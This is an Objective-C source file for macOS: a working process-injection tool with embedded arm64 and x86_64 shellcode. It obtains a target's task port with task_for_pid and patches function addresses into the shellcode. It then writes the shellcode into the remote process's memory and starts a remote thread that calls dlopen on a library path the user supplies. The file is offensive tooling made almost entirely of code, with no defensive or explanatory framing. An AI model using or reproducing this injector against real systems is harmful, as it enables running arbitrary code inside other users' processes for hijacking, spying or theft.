#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <mach/mach_vm.h>
#import <mach/thread_status.h>
#import <malloc/malloc.h>
#import <pthread.h>
#import <sys/stat.h>

#define STACK_SIZE 0x10000
#define CODE_SIZE 128

char injectedCode[] =
#ifdef __arm64__

    //"\x20\x8e\x38\xd4" //brk    #0xc471
    "\xe0\x03\x00\x91"
    "\x00\x40\x00\xd1"
    "\xe1\x03\x1f\xaa"
    "\xe3\x03\x1f\xaa"
    "\xc4\x00\x00\x10"
    "\x22\x01\x00\x10"
    "\x85\x00\x40\xf9"
    "\xa0\x00\x3f\xd6"
    "\x07\x00\x00\x10"
    "\xe0\x00\x1f\xd6"
    "\x50\x54\x48\x52"
    "\x44\x43\x52\x54"
    "\x44\x4c\x4f\x50"
    "\x45\x4e\x5f\x5f"
    "\x21\x00\x80\xd2"
    "\x80\x00\x00\x10"
    "\x87\xff\xff\x10"
    "\xe8\x00\x40\xf9"
    "\x00\x01\x3f\xd6"
    "\x4c\x49\x42\x4c"
    "\x49\x42\x4c\x49"
    "\x42\x4c\x49\x42"
    "\x4c\x49\x42\x4c"
    "\x49\x42\x4c\x49"
    "\x42\x4c\x49\x42"
    "\x4c\x49\x42\x4c"
    "\x49\x42\x4c\x49"
    "\x42\x4c\x49\x42"
    "\x4c\x49\x42\x4c"
    "\x49\x42\x4c\x49"
    "\x42\x4c\x49\x42"
    "\x4c\x49\x42\x4c"
    "\x49\x42\x4c\x49"
    "\x42\x4c\x49\x42"
    "\x4c\x49\x42\x4c"
    "\x49\x42\x4c\x49"
    "\x42\x4c\x49\x42"
    "\x4c\x49\x42\x4c"
    "\x49\x42\x4c\x49"
    "\x42\x4c\x49\x42";
/*
Compile: as shellcode.asm -o shellcode.o && ld ./shellcode.o -o shellcode
-lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path` shellcode.asm: .global
_main .align 4 _main: mov x0, sp sub x0, x0, #16 mov x1, xzr mov x3, xzr adr x4,
pthrdcrt adr x2, _thread ldr x5, [x4] blr x5 _loop: adr x7, _loop br x7
 pthrdcrt: .ascii "PTHRDCRT"
 dlllopen: .ascii "DLOPEN__"
 _thread:
         mov x1, #1
         adr x0, lib
         adr x7, dlllopen
         ldr x8, [x7]
         blr x8
 lib: .ascii
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
 */
#else
    // "\xCC"                            // int3

    "\x55"                         // push       rbp
    "\x48\x89\xE5"                 // mov        rbp, rsp
    "\x48\x83\xEC\x10"             // sub        rsp, 0x10
    "\x48\x8D\x7D\xF8"             // lea        rdi, qword [rbp+var_8]
    "\x31\xC0"                     // xor        eax, eax
    "\x89\xC1"                     // mov        ecx, eax
    "\x48\x8D\x15\x21\x00\x00\x00" // lea        rdx, qword ptr [rip + 0x21]
    "\x48\x89\xCE"                 // mov        rsi, rcx
    "\x48\xB8" // movabs     rax, pthread_create_from_mach_thread
    "PTHRDCRT"
    "\xFF\xD0"                     // call       rax
    "\x89\x45\xF4"                 // mov        dword [rbp+var_C], eax
    "\x48\x83\xC4\x10"             // add        rsp, 0x10
    "\x5D"                         // pop        rbp
    "\x48\xc7\xc0\x13\x0d\x00\x00" // mov        rax, 0xD13
    "\xEB\xFE"                     // jmp        0x0
    "\xC3"                         // ret

    "\x55"                         // push       rbp
    "\x48\x89\xE5"                 // mov        rbp, rsp
    "\x48\x83\xEC\x10"             // sub        rsp, 0x10
    "\xBE\x01\x00\x00\x00"         // mov        esi, 0x1
    "\x48\x89\x7D\xF8"             // mov        qword [rbp+var_8], rdi
    "\x48\x8D\x3D\x1D\x00\x00\x00" // lea        rdi, qword ptr [rip + 0x2c]
    "\x48\xB8"                     // movabs     rax, dlopen
    "DLOPEN__"
    "\xFF\xD0"         // call       rax
    "\x31\xF6"         // xor        esi, esi
    "\x89\xF7"         // mov        edi, esi
    "\x48\x89\x45\xF0" // mov        qword [rbp+var_10], rax
    "\x48\x89\xF8"     // mov        rax, rdi
    "\x48\x83\xC4\x10" // add        rsp, 0x10
    "\x5D"             // pop        rbp
    "\xC3"             // ret

    "LIBLIBLIBLIB"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00";
#endif

int main(int argc, char *argv[]) {
  if (argc < 3) {
    printf("Usage: %s <pid> <path>\n", argv[0]);
    exit(0);
  }

  pid_t pid = atoi(argv[1]);
  char *path = argv[2];

  struct stat buf;
  int rc = stat(path, &buf);
  if (rc != 0) {
    printf("Unable to open library file %s\n", path);
    exit(0);
  }

  @autoreleasepool {
    task_t rtask;
    kern_return_t kr;

    kr = task_for_pid(mach_task_self(), pid, &rtask);
    if (kr != KERN_SUCCESS) {
      printf("[-] Failed to get task port for pid:%d, error: %s\n", pid,
             mach_error_string(kr));
      return -1;
    }
    printf("[+] Got access to the task port of process: %d\n", pid);

    printf("[+] Wrote asm to remote process\n");
    int i = 0;
    char *possiblePatchLocation = (injectedCode);
    for (i = 0; i < 0x100; i++) {
      extern void *_pthread_set_self;
      possiblePatchLocation++;

      uint64_t addrOfPthreadCreate =
          (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
      uint64_t addrOfPthreadExit =
          (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");
      uint64_t addrOfDlopen = (uint64_t)dlopen;

      if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0) {
        printf("pthread_create_from_mach_thread @%llx\n", addrOfPthreadCreate);
        memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
      }

      if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0) {
        printf("dlopen @%llx\n", addrOfDlopen);
        memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
      }

      if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0) {
        strcpy(possiblePatchLocation, path);
      }
    }
    mach_vm_address_t remote_code;
    mach_vm_allocate(rtask, &remote_code, CODE_SIZE, VM_FLAGS_ANYWHERE);
    mach_vm_write(rtask,                     // Task port
                  remote_code,               // Virtual Address (Destination)
                  (vm_offset_t)injectedCode, // Source
                  sizeof(injectedCode));     // Length of the source
    mach_vm_protect(rtask, remote_code, sizeof(injectedCode), FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);

    printf("[+] Created remote stack\n");
    mach_vm_address_t remote_stack;
    mach_vm_allocate(rtask, &remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    mach_vm_protect(rtask, remote_stack, STACK_SIZE, TRUE,
                    VM_PROT_READ | VM_PROT_WRITE);

    printf("[+] Created remote thread\n");
    thread_act_t thread;
    remote_stack += STACK_SIZE / 2;
#ifdef __arm64__
    arm_thread_state64_t remote_state;
    remote_state.__pc = remote_code;
    remote_state.__sp = remote_stack;
    kr = thread_create_running(rtask, ARM_THREAD_STATE64,
                               (thread_state_t)&remote_state,
                               ARM_THREAD_STATE64_COUNT, &thread);
#else
    x86_thread_state64_t remote_state;
    remote_state.__rsp = remote_stack;
    remote_state.__rbp = remote_stack;
    remote_state.__rip = remote_code;
    kr = thread_create_running(rtask, x86_THREAD_STATE64,
                               (thread_state_t)&remote_state,
                               x86_THREAD_STATE64_COUNT, &thread);
#endif
    if (kr != KERN_SUCCESS) {
      if (kr != KERN_SUCCESS) {
        printf("[-] Unable to create remote thread, pid:%d, error: %s\n", pid,
               mach_error_string(kr));
        return -2;
      }
    }
  }

  return 0;
}